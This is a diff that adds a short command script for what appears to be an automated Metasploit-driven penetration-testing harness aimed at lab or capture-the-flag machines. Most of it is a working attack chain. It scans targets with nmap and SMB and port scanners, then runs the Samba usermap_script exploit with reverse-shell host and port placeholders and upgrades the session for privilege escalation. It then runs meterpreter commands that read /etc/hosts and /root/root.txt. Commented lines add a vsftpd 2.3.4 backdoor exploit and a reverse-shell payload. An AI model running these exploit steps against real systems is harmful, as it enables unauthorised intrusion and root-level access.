@@ -1,0 +1,48 @@
+# IMPORTANT, SET TARGET
+set_target 10.129.165.101; db_nmap; set dst_ip 10.129.165.101; set MODE top_100; set delay_to_observe 1; run;
+
+auxiliary/scanner/smb/smb_version; set rhosts 10.129.59.222; set delay_to_observe 11; run;
+
+auxiliary/scanner/portscan/ack; set rhosts 10.129.59.222; set delay_to_observe 60; run;
+
+set_target 10.129.58.27; exploit/multi/samba/usermap_script; set delay_to_observe 15; set rhosts 10.129.58.27; set lhost <LOCAL_IP>; set lport <REVSHELL_PORT>; run;
+
+set_game_type PRIVESC;
+
+upgrade_metasploit_session; set delay_to_observe 30; run;
+
+#############################
+
+
+#execute_meterpretershell_command_in_session; set COMMAND whoami; run; #options
+
+#execute_meterpretershell_command_in_session; set COMMAND cat /etc/hosts; run; #options
+
+#execute_meterpretershell_command_in_session; set COMMAND cat /root/root.txt; run; #options
+
+# execute_meterpretershell_command_in_session;
+# options;
+# set command cat /root/root.txt;
+# run;
+
+#execute_meterpretershell_command_in_session; guess_options; run; #options
+# set command cat /root/root.txt;
+
+
+# guess_options;
+# set command find /root -name root.txt 2>/dev/null;
+
+#execute_meterpretershell_command_in_session; set COMMAND cat /etc/hosts; run;
+
+#exploit/multi/samba/usermap_script; options; guess_options; run;
+
+#db_nmap; guess_options; run;
+
+execute_meterpreter_command; set COMMAND getuid; run;
+
+# Try ftp exploit
+#exploit/unix/ftp/vsftpd_234_backdoor; run;
+
+#set payload cmd/unix/reverse; 
+
+#set delay_to_observe 1; set rhosts 10.10.10.3; set lhost <LOCAL_IP>; set lport <REVSHELL_PORT>; set payload cmd/unix/reverse;
